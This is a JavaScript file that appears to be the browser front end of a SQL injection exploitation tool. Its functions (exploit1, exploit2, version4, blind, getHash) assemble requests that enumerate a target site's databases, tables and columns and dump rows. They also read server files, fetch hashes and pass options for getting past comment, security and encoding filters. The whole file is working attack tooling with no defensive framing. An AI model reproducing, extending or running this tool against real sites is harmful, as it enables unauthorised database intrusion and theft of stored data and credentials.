function _escape(str) 
{
	str=str.replace(/\&/g,'abc1');
	return str;
}

function __escape(input) 
{
	var output = "";
	for (var i = 0; i < input.length; i++) 
	{
		if((input.charCodeAt(i) == 13) && (input.charCodeAt(i + 1) == 10)) 
		{
			i++;
			output += "<BR>";
		}
		else if(input.charCodeAt(i) == 10) 
		{
			output += "abc2";
		} 
		else
		{
			output += input.charAt(i);
		}
	}
	return output;
}

function enable()
{
	if(document.getElementById("useGroupConcat_0").checked)
		document.getElementById("speed").disabled = false;
	else
		document.getElementById("speed").disabled = true;
}

function autoFill(s,d)
{
	document.getElementById(d).value = document.getElementById(s).value;
}

function showListColumn()
{
	document.getElementById("id").innerHTML = document.getElementById("listColumn").value;
}

function exploit1(option)
{
	if(window.XMLHttpRequest)
	{
		xmlhttp = new XMLHttpRequest();
	}
	else
	{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}	
	var urlExploit = document.getElementById("urlFileAjax").value;
		urlExploit += "?op=" + option;
		urlExploit += "&url=" + _escape(document.getElementById("url").value);
		urlExploit += "&countColumn=" + document.getElementById("countColumn").value;
		urlExploit += "&exploitColumn=" + document.getElementById("exploitColumn").value;
		urlExploit += "&commentBypass=" + document.getElementById("commentBypass").value;
		urlExploit += "&secBypass=" + document.getElementById("secBypass").value;
		if(document.getElementById("encodeBypass_0").checked)
		{
			urlExploit += "&encodeBypass=0";
		}
		else if(document.getElementById("encodeBypass_1").checked)
		{
			urlExploit += "&encodeBypass=1";
		}
		else if(document.getElementById("encodeBypass_2").checked)
		{
			urlExploit += "&encodeBypass=2";
		}
		if(document.getElementById("useGroupConcat_0").checked)
		{
			urlExploit += "&useGroupConcat=0";
			urlExploit += "&speed=" + document.getElementById("speed").value;
		}
		else if(document.getElementById("useGroupConcat_1").checked)
		{
			urlExploit += "&useGroupConcat=1";
		}
	var urlExploit0 = document.getElementById("urlFileAjax").value;
		urlExploit0 += "?op=" + option;
		urlExploit0 += "&url=" + _escape(document.getElementById("url").value);
		
	if(option == 0)
	{
		obj = document.getElementById("setup");
	}
	else if(option == 1)
	{
		obj = document.getElementById("info");
	}
	else if(option == 2)
	{
		obj = document.getElementById("table");
		urlExploit += "&db=" + document.getElementById("dbs").value;
	}
	else if(option == 3)
	{
		obj = document.getElementById("column");
		urlExploit += "&db=" + document.getElementById("dbExploit").value;
		urlExploit += "&table=" + document.getElementById("tables").value;
	}
	else if(option == 4)
	{
		urlExploit += "&file=" + document.getElementById("file").value;
		window.open(urlExploit);
		exit();
	}
	else if(option == 5)
	{
		obj = document.getElementById("additions");
		urlExploit += "&db=" + document.getElementById("dbExploit").value;
		urlExploit += "&table=" + document.getElementById("tableExploit").value;
	}
	else if(option == 6)
	{
		obj = document.getElementById("additions");
		urlExploit += "&db=" + document.getElementById("dbExploit").value;
		urlExploit += "&table=" + document.getElementById("tableExploit").value;
		urlExploit += "&column=" + document.getElementById("columns").value;
	}
	else if(option == 7)
	{
		obj = document.getElementById("data");
		urlExploit += "&db=" + document.getElementById("dbGetData").value;
		urlExploit += "&table=" + document.getElementById("tableGetData").value;
		urlExploit += "&listColumnGetData=" + __escape(document.getElementById("listColumnGetData").value);
		urlExploit += "&columnFilterGetData=" + document.getElementById("columnFilterGetData").value;
		urlExploit += "&from=" + document.getElementById("from").value;
		urlExploit += "&to=" + document.getElementById("to").value;
		urlExploit += "&addition=" + __escape(document.getElementById("addition").value);
		
		if(document.getElementById("newTab").checked)
		{
			window.open(urlExploit);
			exit();
		}
	}
	if(option == 0)
	{
		xmlhttp.open("GET",urlExploit0,true);
	}
	else
	{
		xmlhttp.open("GET",urlExploit,true);
	}
	xmlhttp.onreadystatechange = function ()
	{
				obj.innerHTML = xmlhttp.responseText;
	}

	xmlhttp.send("null");
}	

function exploit2(option)
{
	if(window.XMLHttpRequest)
	{
		xmlhttp = new XMLHttpRequest();
	}
	else
	{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}	
	var urlExploit = document.getElementById("urlFileAjax").value;
		urlExploit += "?op=" + option;
		urlExploit += "&url=" + _escape(document.getElementById("url").value);
		urlExploit += "&commentBypass=" + document.getElementById("commentBypass").value;
		if(document.getElementById("useGroupConcat").checked)
		{
			urlExploit += "&useGroupConcat=1";
		}
		urlExploit += "&strlen=" + document.getElementById("strlen").value;

		if(document.getElementById("secBypass_0").checked)
		{
			urlExploit += "&secBypass=0";
		}
		else if(document.getElementById("secBypass_1").checked)
		{
			urlExploit += "&secBypass=1";
		}

	var urlExploit0 = document.getElementById("urlFileAjax").value;
		urlExploit0 += "?op=" + option;
		urlExploit0 += "&url=" + _escape(document.getElementById("url").value);
		
	if(option == 0)
	{
		obj = document.getElementById("setup");
	}
	if(option == 1)
	{
		
		obj = document.getElementById("info");
	}
	else if(option == 2)
	{
		obj = document.getElementById("table");
		urlExploit += "&db=" + document.getElementById("dbs").value;
	}
	else if(option == 3)
	{
		obj = document.getElementById("column");
		urlExploit += "&db=" + document.getElementById("dbExploit").value;
		urlExploit += "&table=" + document.getElementById("tables").value;
	}
	else if(option == 4)
	{
		obj = document.getElementById("id");
		urlExploit += "&db=" + document.getElementById("dbExploit").value;
		urlExploit += "&table=" + document.getElementById("tableExploit").value;
		urlExploit += "&column=" + document.getElementById("columns").value;
	}
	else if(option == 5)
	{
		obj = document.getElementById("data");
		urlExploit += "&db=" + document.getElementById("dbGetData").value;
		urlExploit += "&table=" + document.getElementById("tableGetData").value;
		urlExploit += "&listColumnGetData=" + __escape(document.getElementById("listColumnGetData").value);
		urlExploit += "&columnFilterGetData=" + document.getElementById("columnFilterGetData").value;
		urlExploit += "&from=" + document.getElementById("from").value;
		urlExploit += "&to=" + document.getElementById("to").value;
		urlExploit += "&addition=" + __escape(document.getElementById("addition").value);
	}
	xmlhttp.open("GET",urlExploit,true);
	xmlhttp.onreadystatechange = function ()
	{
				obj.innerHTML = xmlhttp.responseText;
	}

	xmlhttp.send("null");
}

function version4(option)
{
	if(window.XMLHttpRequest)
	{
		xmlhttp = new XMLHttpRequest();
	}
	else
	{
		xmlhttp = ActiveXObject("Microsoft.XMLHTTP");
	}


	var urlExploit = document.getElementById("urlFileAjax").value;
		urlExploit += "?op=" + option;
		urlExploit += "&url=" + _escape(document.getElementById("url").value);
		urlExploit += "&string=" + __escape(document.getElementById("string").value);
		urlExploit += "&commentBypass=" + __escape(document.getElementById("commentBypass").value);
		

	if(document.getElementById("secBypass_0").checked)
	{
		urlExploit += "&secBypass=0";
	}
	else if(document.getElementById("secBypass_1").checked)
	{
		urlExploit += "&secBypass=1";
	}

	if(document.getElementById("tableType_1").checked)
	{
		urlExploit += "&tableType=1";
	}
	else if(document.getElementById("tableType_2").checked)
	{
		urlExploit += "&tableType=2";
	}


	if(option == 1)
	{
		obj = document.getElementById("listTable");
		xmlhttp.open("GET",urlExploit,true);
		xmlhttp.onreadystatechange = function ()
		{
			if(xmlhttp.readyState == 4)
			{
				obj.innerHTML = xmlhttp.responseText;
			}
		}		
		xmlhttp.send("null");
	}
	else if(option == 2)
	{
		obj = document.getElementById("listColumn");
		xmlhttp.open("GET",urlExploit,true);
		xmlhttp.onreadystatechange = function ()
		{
			if(xmlhttp.readyState == 4)
			{
				obj.innerHTML = xmlhttp.responseText;
			}
		}
		xmlhttp.send("null");
	}
	else if(option == 3)
	{
		urlExploit += "&speed=" + document.getElementById("speed").value;
		urlExploit += "&prefixTable=" + document.getElementById("prefixTable").value;
		xmlhttp.open("GET",urlExploit,true);

		obj = document.getElementById("tableResult");
		xmlhttp.onreadystatechange = function ()
		{
				obj.innerHTML = xmlhttp.responseText;
		}
		xmlhttp.send(null);
	}
	else if(option == 4)
	{
		urlExploit += "&speed=" + document.getElementById("speed").value;
		urlExploit += "&tableBlind=" + document.getElementById("tableBlind").value;
		urlExploit += "&prefixColumn=" + document.getElementById("prefixColumn").value;
		
		
		xmlhttp.open("GET",urlExploit,true);

		obj = document.getElementById("columnResult");
		xmlhttp.onreadystatechange = function ()
		{
				obj.innerHTML = xmlhttp.responseText;
		}
		xmlhttp.send(null);
	}
}
function blind(option)
{
	if(window.XMLHttpRequest)
	{
		xmlhttp = new XMLHttpRequest();
	}
	else
	{
		xmlhttp = new ActiveXObject("Microsoft.XMLHTTP");
	}	
	var urlExploit = document.getElementById("urlFileAjax").value;
		urlExploit += "?op=" + option;
		urlExploit += "&url=" + _escape(document.getElementById("url").value);
		urlExploit += "&string=" + _escape(document.getElementById("string").value);
		urlExploit += "&commentBypass=" + document.getElementById("commentBypass").value;
		if(document.getElementById("secBypass_0").checked)
		{
			urlExploit += "&secBypass=0";
		}
		else if(document.getElementById("secBypass_1").checked)
		{
			urlExploit += "&secBypass=1";
		}
		if(document.getElementById("limitChar_0").checked)
		{
			urlExploit += "&limitChar_0=1";
		}
		if(document.getElementById("limitChar_1").checked)
		{
			urlExploit += "&limitChar_1=1";
		}
		if(document.getElementById("limitChar_2").checked)
		{
			urlExploit += "&limitChar_2=1";
		}
		if(document.getElementById("limitChar_3").checked)
		{
			urlExploit += "&limitChar_3=" + document.getElementById("specialChar").value;
		}
	if(option == 1)
	{
		obj = document.getElementById("info");
	}


	xmlhttp.open("GET",urlExploit,true);
	xmlhttp.onreadystatechange = function ()
	{
		obj.innerHTML = xmlhttp.responseText;
	}
	xmlhttp.send("null");

}
function getHash(id)
{
	var urlExploit = document.getElementById("urlFileAjax").value;
		urlExploit += "?op=hash";
	obj = document.getElementById(id);
	xmlhttp.open("GET",urlExploit,true);
	xmlhttp.onreadystatechange = function ()
		{
			if(xmlhttp.readyState == 4)
			{
				obj.innerHTML = xmlhttp.responseText;
			}
		}
	xmlhttp.send(null);
}

